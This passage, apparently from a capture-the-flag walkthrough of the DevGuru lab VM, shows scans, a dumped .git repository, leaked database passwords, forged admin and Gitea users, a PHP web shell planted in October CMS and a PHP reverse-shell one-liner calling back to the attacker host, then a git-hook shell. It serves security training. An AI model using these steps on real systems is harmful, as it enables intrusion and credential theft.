+SF:t&lt;title&gt;Page<span style="color:#ae81ff">\x</span>20Not<span style="color:#ae81ff">\x</span>20Found<span style="color:#ae81ff">\x</span>20-<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20Gitea:<span style="color:#ae81ff">\x</span>20Git<span style="color:#ae81ff">\x</span>20with<span style="color:#ae81ff">\x</span>20a<span style="color:#ae81ff">\x</span>20
+SF:cup<span style="color:#ae81ff">\x</span>20of<span style="color:#ae81ff">\x</span>20tea<span style="color:#ae81ff">\x</span>20&lt;/title&gt;<span style="color:#ae81ff">\n\t</span>&lt;link<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>manifest<span style="color:#ae81ff">\&#34;\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>/ma
+SF:nifest<span style="color:#ae81ff">\.</span>json<span style="color:#ae81ff">\&#34;\x</span>20crossorigin<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>use-credentials<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>t
+SF:heme-color<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#75715e">#6cc644\&#34;&gt;\n\t&lt;meta\x20name=\&#34;author\&#34;\x20con</span>
+SF:tent<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>Gitea<span style="color:#ae81ff">\x</span>20-<span style="color:#ae81ff">\x</span>20Git<span style="color:#ae81ff">\x</span>20with<span style="color:#ae81ff">\x</span>20a<span style="color:#ae81ff">\x</span>20cup<span style="color:#ae81ff">\x</span>20of<span style="color:#ae81ff">\x</span>20tea<span style="color:#ae81ff">\&#34;\x</span>20/&gt;<span style="color:#ae81ff">\n\t</span>&lt;m
+SF:eta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>description<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>Gitea<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\(</span>Git<span style="color:#ae81ff">\x</span>20with<span style="color:#ae81ff">\x</span>20a<span style="color:#ae81ff">\x</span>2
+SF:0c<span style="color:#e6db74">&#34;);
+</span><span style="color:#e6db74">MAC Address: 08:00:27:FF:2C:BE (Oracle VirtualBox virtual NIC)
+</span><span style="color:#e6db74">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+</span><span style="color:#e6db74">Device type: general purpose
+</span><span style="color:#e6db74">Running: Linux 4.X|5.X
+</span><span style="color:#e6db74">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+</span><span style="color:#e6db74">OS details: Linux 4.15 - 5.6
+</span><span style="color:#e6db74">Network Distance: 1 hop
+</span><span style="color:#e6db74">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">TRACEROUTE
+</span><span style="color:#e6db74">HOP RTT     ADDRESS
+</span><span style="color:#e6db74">1   1.83 ms 192.168.0.63
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span><span style="color:#e6db74">Nmap done: 1 IP address (1 host up) scanned in 101.57 seconds
+</span><span style="color:#e6db74">
+</span></code></pre></div><p>Site <strong>DevGuru</strong> available in port <code>80</code>.</p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055825/blog/image-20201210112759467_xivcws.png" alt="image-20201210112759467"></p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055825/blog/image-20201210213342631_ckzu70.png" alt="image-20201210213342631"></p>
+<p><strong>Gitea</strong> in port <code>8585</code>.</p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055823/blog/image-20201210112847850_i8cfxf.png" alt="image-20201210112847850"></p>
+<p>Scanning and enumerating all websites.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>root💀kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/tiago<span style="color:#f92672">]</span>
+└─# nikto -h 192.168.0.63
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.0.63
++ Target Hostname:    192.168.0.63
++ Target Port:        80
++ Start Time:         2020-12-10 11:37:30 <span style="color:#f92672">(</span>GMT-3<span style="color:#f92672">)</span>
+---------------------------------------------------------------------------
++ Server: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found <span style="color:#f92672">(</span>use <span style="color:#e6db74">&#39;-C all&#39;</span> to force check all possible dirs<span style="color:#f92672">)</span>
++ Apache/2.4.29 appears to be outdated <span style="color:#f92672">(</span>current is at least Apache/2.4.37<span style="color:#f92672">)</span>. Apache 2.2.34 is the EOL <span style="color:#66d9ef">for</span> the 2.x branch.
++ OSVDB-3093: /.htaccess: Contains configuration and/or authorization information
++ OSVDB-3233: /icons/README: Apache default file found.
++ OSVDB-3092: /.git/index: Git Index file may contain directory listing information.
++ /.git/HEAD: Git HEAD file found. Full repo details may be present.
++ /.git/config: Git config file found. Infos about repo details may be present.
++ X-XSS-Protection header has been set to disable XSS Protection. There is unlikely to be a good reason <span style="color:#66d9ef">for</span> this.
++ /.gitignore: .gitignore file found. It is possible to grasp the directory structure.
++ <span style="color:#ae81ff">7915</span> requests: <span style="color:#ae81ff">0</span> error<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">11</span> item<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> reported on remote host
++ End Time:           2020-12-10 11:40:03 <span style="color:#f92672">(</span>GMT-3<span style="color:#f92672">)</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">153</span> seconds<span style="color:#f92672">)</span>
+---------------------------------------------------------------------------
++ <span style="color:#ae81ff">1</span> host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> tested
+
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>tiago㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+└─$ nikto -h 192.168.0.63:8585                                          
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.0.63
++ Target Hostname:    192.168.0.63
++ Target Port:        8585
++ Start Time:         2020-12-10 11:37:50 <span style="color:#f92672">(</span>GMT-3<span style="color:#f92672">)</span>
+---------------------------------------------------------------------------
++ Server: No banner retrieved
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Cookie lang created without the httponly flag
++ No CGI Directories found <span style="color:#f92672">(</span>use <span style="color:#e6db74">&#39;-C all&#39;</span> to force check all possible dirs<span style="color:#f92672">)</span>
++ Uncommon header <span style="color:#e6db74">&#39;content-disposition&#39;</span> found, with contents: attachment; filename<span style="color:#f92672">=</span>favicon.png
++ Uncommon header <span style="color:#e6db74">&#39;content-transfer-encoding&#39;</span> found, with contents: binary
++ Uncommon header <span style="color:#e6db74">&#39;content-description&#39;</span> found, with contents: File Transfer
++ Cookie redirect_to created without the httponly flag
++ /debug/: Possible debug directory/program found.
++ <span style="color:#ae81ff">7919</span> requests: <span style="color:#ae81ff">0</span> error<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">8</span> item<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> reported on remote host
++ End Time:           2020-12-10 11:38:19 <span style="color:#f92672">(</span>GMT-3<span style="color:#f92672">)</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">29</span> seconds<span style="color:#f92672">)</span>
+---------------------------------------------------------------------------
++ <span style="color:#ae81ff">1</span> host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> tested
+
+</code></pre></div><p>Doing some enumeration with <code>ffuf</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>root💀kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/tiago/apps/tools/ffuf_1.1.0_linux_amd64<span style="color:#f92672">]</span>
+└─# ./ffuf -w /usr/share/wordlists/dirb/big.txt -u http://192.168.0.63/FUZZ
+
+        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
+       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
+       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
+        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
+         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
+          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
+
+       v1.1.0
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://192.168.0.63/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+.htaccess               <span style="color:#f92672">[</span>Status: 200, Size: 1678, Words: 282, Lines: 53<span style="color:#f92672">]</span>
+<span style="color:#ae81ff">0</span>                       <span style="color:#f92672">[</span>Status: 200, Size: 12664, Words: 929, Lines: 331<span style="color:#f92672">]</span>
+About                   <span style="color:#f92672">[</span>Status: 200, Size: 18656, Words: 977, Lines: 478<span style="color:#f92672">]</span>
+Services                <span style="color:#f92672">[</span>Status: 200, Size: 10026, Words: 815, Lines: 267<span style="color:#f92672">]</span>
+about                   <span style="color:#f92672">[</span>Status: 200, Size: 18656, Words: 977, Lines: 478<span style="color:#f92672">]</span>
+backend                 <span style="color:#f92672">[</span>Status: 302, Size: 406, Words: 60, Lines: 12<span style="color:#f92672">]</span>
+config                  <span style="color:#f92672">[</span>Status: 301, Size: 313, Words: 20, Lines: 10<span style="color:#f92672">]</span>
+modules                 <span style="color:#f92672">[</span>Status: 301, Size: 314, Words: 20, Lines: 10<span style="color:#f92672">]</span>
+plugins                 <span style="color:#f92672">[</span>Status: 301, Size: 314, Words: 20, Lines: 10<span style="color:#f92672">]</span>
+services                <span style="color:#f92672">[</span>Status: 200, Size: 10026, Words: 815, Lines: 267<span style="color:#f92672">]</span>
+storage                 <span style="color:#f92672">[</span>Status: 301, Size: 314, Words: 20, Lines: 10<span style="color:#f92672">]</span>
+themes                  <span style="color:#f92672">[</span>Status: 301, Size: 313, Words: 20, Lines: 10<span style="color:#f92672">]</span>
+vendor                  <span style="color:#f92672">[</span>Status: 301, Size: 313, Words: 20, Lines: 10<span style="color:#f92672">]</span>
+:: Progress: <span style="color:#f92672">[</span>20469/20469<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>1/1<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">97</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:03:30<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">0</span> ::
+
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>tiago㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/apps/tools/ffuf_1.1.0_linux_amd64<span style="color:#f92672">]</span>
+└─$ ./ffuf -w /usr/share/wordlists/dirb/big.txt -u http://192.168.0.63:8585/FUZZ                                                                        <span style="color:#ae81ff">127</span> ⨯
+
+        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
+       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
+       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
+        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
+         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
+          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
+
+       v1.1.0
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://192.168.0.63:8585/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+admin                   <span style="color:#f92672">[</span>Status: 302, Size: 34, Words: 2, Lines: 3<span style="color:#f92672">]</span>
+avatars                 <span style="color:#f92672">[</span>Status: 302, Size: 31, Words: 2, Lines: 3<span style="color:#f92672">]</span>
+css                     <span style="color:#f92672">[</span>Status: 302, Size: 27, Words: 2, Lines: 3<span style="color:#f92672">]</span>
+debug                   <span style="color:#f92672">[</span>Status: 200, Size: 160, Words: 18, Lines: 5<span style="color:#f92672">]</span>
+explore                 <span style="color:#f92672">[</span>Status: 302, Size: 37, Words: 2, Lines: 3<span style="color:#f92672">]</span>
+fonts                   <span style="color:#f92672">[</span>Status: 302, Size: 29, Words: 2, Lines: 3<span style="color:#f92672">]</span>
+frank                   <span style="color:#f92672">[</span>Status: 200, Size: 11236, Words: 968, Lines: 345<span style="color:#f92672">]</span>
+healthcheck             <span style="color:#f92672">[</span>Status: 200, Size: 26, Words: 4, Lines: 2<span style="color:#f92672">]</span>
+img                     <span style="color:#f92672">[</span>Status: 302, Size: 27, Words: 2, Lines: 3<span style="color:#f92672">]</span>
+issues                  <span style="color:#f92672">[</span>Status: 302, Size: 34, Words: 2, Lines: 3<span style="color:#f92672">]</span>
+js                      <span style="color:#f92672">[</span>Status: 302, Size: 26, Words: 2, Lines: 3<span style="color:#f92672">]</span>
+milestones              <span style="color:#f92672">[</span>Status: 302, Size: 34, Words: 2, Lines: 3<span style="color:#f92672">]</span>
+notifications           <span style="color:#f92672">[</span>Status: 302, Size: 34, Words: 2, Lines: 3<span style="color:#f92672">]</span>
+vendor                  <span style="color:#f92672">[</span>Status: 302, Size: 30, Words: 2, Lines: 3<span style="color:#f92672">]</span>
+:: Progress: <span style="color:#f92672">[</span>20469/20469<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>1/1<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">346</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:00:59<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">0</span> ::
+
+</code></pre></div><p>Back to <code>nikto</code> look at those <strong>git</strong> files available to us. The same can be achieved with <code>nuclei</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">./nuclei -l urls.txt -t nuclei-templates/files/ -o results.txt
+</code></pre></div><p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055823/blog/image-20201210205544106_tbrzda.png" alt="image-20201210205544106"></p>
+<p>Now we can dump it easily with <code>git-dumper</code> on folder <strong>devguru</strong>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">./git-dumper.py http://192.168.0.63/.git devguru
+</code></pre></div><p>Inside <strong>devguru</strong> folder, you&rsquo;ll finde only <code>.git</code> file. Let&rsquo;s analyse it and checkout to last commit.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">git log --pretty<span style="color:#f92672">=</span>oneline
+</code></pre></div><p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055823/blog/image-20201210210115139_amlkyd.png" alt="image-20201210210115139"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">git log --pretty<span style="color:#f92672">=</span>format:<span style="color:#e6db74">&#34;%h %s&#34;</span> --graph
+</code></pre></div><p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055823/blog/image-20201210210158553_fjaisy.png" alt="image-20201210210158553"></p>
+<p>Now checkout to commit and list it&rsquo;s content.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">git checkout 7de9115
+ls
+</code></pre></div><p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055823/blog/image-20201210210304335_mcqsqb.png" alt="image-20201210210304335"></p>
+<p>Looking for password in <code>config</code> folder.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">fgrep -r password config/
+</code></pre></div><p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055824/blog/image-20201210211308719_z9xvmi.png" alt="image-20201210211308719"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">&#39;mysql&#39; =&gt; [
+            &#39;driver&#39;     =&gt; &#39;mysql&#39;,
+            &#39;engine&#39;     =&gt; &#39;InnoDB&#39;,
+            &#39;host&#39;       =&gt; &#39;localhost&#39;,
+            &#39;port&#39;       =&gt; 3306,
+            &#39;database&#39;   =&gt; &#39;octoberdb&#39;,
+            &#39;username&#39;   =&gt; &#39;october&#39;,
+            &#39;password&#39;   =&gt; &#39;SQ66EBYx4GT3byXH&#39;,
+            &#39;charset&#39;    =&gt; &#39;utf8mb4&#39;,
+            &#39;collation&#39;  =&gt; &#39;utf8mb4_unicode_ci&#39;,
+            &#39;prefix&#39;     =&gt; &#39;&#39;,
+            &#39;varcharmax&#39; =&gt; 191,
+        ],
+
+</code></pre></div><p>Look at the path <code>adminer.php</code>, sounds interesting.</p>
+<p>The database Adminer has its version as 4.7.7, giving me suggestion to update to 4.7.8. Maybe some vulnerability ahead.</p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055825/blog/image-20201210211707046_ipwlro.png" alt="image-20201210211707046"></p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055824/blog/image-20201210211729792_aoymlv.png" alt="image-20201210211729792"></p>
+<p>Verifying MySQL version</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-mysql" data-lang="mysql"><span style="color:#66d9ef">SHOW</span> VARIABLES <span style="color:#66d9ef">LIKE</span> <span style="color:#e6db74">&#34;%version%&#34;</span>
+</code></pre></div><p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055825/blog/image-20201211093344381_i1xzsl.png" alt="image-20201211093344381"></p>
+<p>Looking at user table.</p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055825/blog/image-20201210212838550_in0uvs.png" alt="image-20201210212838550"></p>
+<p><a href="https://bcrypt-generator.com/">Create a bcrypt password</a>. Take care with the amount of rounds, I used 10 rounds.</p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055825/blog/image-20201211094754135_srnjgp.png" alt="image-20201211094754135"></p>
+<p>Password <code>GetShell</code></p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055825/blog/image-20201211095607153_hxumxy.png" alt="image-20201211095607153"></p>
+<p>Clone Frank user line and create yours with your own user.</p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055825/blog/image-20201211095735280_nsskcf.png" alt="image-20201211095735280"></p>
+<p>Now you can login with your user.</p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055826/blog/image-20201211095816647_vgr0wb.png" alt="image-20201211095816647"></p>
+<p>October CMS Version 1.0.1</p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055826/blog/image-20201211135631359_eyp8nd.png" alt="image-20201211135631359"></p>
+<h1 id="-foothold">🚪🚶 Foothold</h1>
+<p>Once logged into October, we can add a malicious php code to be executed when the page loaded. Let&rsquo;s do it in Home page. First create a malicious markup which will call out php code.</p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055827/blog/image-20201214111732338_gt85yo.png" alt="image-20201214111732338"></p>
+<p>Now insert the malicious code.</p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055826/blog/image-20201214121229631_ygjwtj.png" alt="image-20201214121229631"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">function onStart()
+{
+    $this-&gt;page[&#34;PoisonVar&#34;] = system($_GET[&#39;cmd&#39;]);
+}
+</code></pre></div><p>Save it and run a command through cmd.</p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055826/blog/image-20201214112322377_l94gtz.png" alt="image-20201214112322377"></p>
+<p>This is the response of the listed directory.</p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055826/blog/image-20201214112351520_wjfmrq.png" alt="image-20201214112351520"></p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055827/blog/image-20201214120904737_ulaeyr.png" alt="image-20201214120904737"></p>
+<p>Time to inject a command in cmd and get our first shell.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">php -r &#39;$sock=fsockopen(&#34;192.168.0.64&#34;,1234);$proc=proc_open(&#34;/bin/sh -i&#34;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&#39;
+</code></pre></div><p>Now just wait for the connection.</p>
+<pre><code>┌──(root💀kali)-[/home/tiago]
+└─# rlwrap nc -nlvp 1234                                                                                                                                   
+listening on [any] 1234 .
+</code></pre><p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055827/blog/image-20201214121518763_i6a2rk.png" alt="image-20201214121518763"></p>
+<p>Spawning a better shell</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3.6 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</code></pre></div><pre><code>cd /tmp
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+chmod +x LinEnum.sh
+./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
+</code></pre><p>LinEnum script found some interesting backup files.</p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055828/blog/image-20201214143419636_wppvjk.png" alt="image-20201214143419636"></p>
+<pre><code>less app.ini.bak
+</code></pre><p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055827/blog/image-20201214144241780_wefohz.png" alt="image-20201214144241780"></p>
+<pre><code>[database]
+:
+; Database to use. Either &quot;mysql&quot;, &quot;postgres&quot;, &quot;mssql&quot; or &quot;sqlite3&quot;.
+:
+DB_TYPE             = mysql
+:
+HOST                = 127.0.0.1:3306
+:
+NAME                = gitea
+:
+USER                = gitea
+:
+; Use PASSWD = `your password` for quoting if you use special characters in the 
+:
+password.
+:
+PASSWD              = UfFPTF8C8jjxVF2m
+
+</code></pre><p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055827/blog/image-20201214150018992_ixz0ox.png" alt="image-20201214150018992"></p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055828/blog/image-20201215122356834_uiytre.png" alt="image-20201215122356834"></p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055828/blog/image-20201215122722667_ebbuim.png" alt="image-20201215122722667"></p>
+<p>The only way I found to reproduce such hash was takeing advantage of this opensource project, reading the code and adapting it to a simple golang program.</p>
+<p><a href="https://github.com/go-gitea/gitea/blob/master/models/user.go#L379-L397">https://github.com/go-gitea/gitea/blob/master/models/user.go#L379-L397</a></p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055828/blog/image-20201215122601633_mxvcck.png" alt="image-20201215122601633"></p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055827/blog/image-20201215122226502_nnsd3f.png" alt="image-20201215122226502"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#75715e">//https://medium.com/rungo/how-to-write-a-simple-go-program-13fd104f3018
+</span><span style="color:#75715e">//https://godoc.org/golang.org/x/crypto/pbkdf2
+</span><span style="color:#75715e"></span>
+<span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
+
+<span style="color:#f92672">import</span> (
+	<span style="color:#e6db74">&#34;crypto/sha256&#34;</span>
+	<span style="color:#e6db74">&#34;golang.org/x/crypto/pbkdf2&#34;</span>
+	<span style="color:#e6db74">&#34;fmt&#34;</span>
+	)
+
+<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>(){
+
+	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">passwd</span> []<span style="color:#66d9ef">byte</span>
+
+	<span style="color:#a6e22e">passwd</span> = <span style="color:#a6e22e">pbkdf2</span>.<span style="color:#a6e22e">Key</span>([]byte(<span style="color:#e6db74">&#34;0xtiago&#34;</span>), []byte(<span style="color:#e6db74">&#34;MaaahOeeee&#34;</span>), <span style="color:#ae81ff">10000</span>, <span style="color:#ae81ff">50</span>, <span style="color:#a6e22e">sha256</span>.<span style="color:#a6e22e">New</span>)
+
+	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;%x&#34;</span>,<span style="color:#a6e22e">passwd</span>))
+}
+</code></pre></div><p>Installing dependency and running the program.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ go get golang.org/x/crypto/pbkdf2
+$ go run hash.go
+f1eb1933069a3552722c29faeeeb1271e2e66c0eae8646201df479f90c99fa4075e8c568852a7a54b7665c3e760911706509
+</code></pre></div><p>Now just clone the table line and create a new user with the hash and salt.</p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055828/blog/image-20201215122449795_yyml1g.png" alt="image-20201215122449795"></p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055828/blog/image-20201215122800138_tnsi7u.png" alt="image-20201215122800138"></p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055828/blog/image-20201215122826958_bnzbge.png" alt="image-20201215122826958"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ps aux | grep gitea
+</code></pre></div><p>Gitea process is running as frank user.</p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055828/blog/image-20201215123052702_uaqhlc.png" alt="image-20201215123052702"></p>
+<p>Create a new repository and add a reverse shell script on post-receive Git hook.</p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055829/blog/image-20201215134117118_tcb6qg.png" alt="image-20201215134117118"></p>
+<p>Then i just had to clone and commit a new change like the example bellow, and received the shell back.</p>
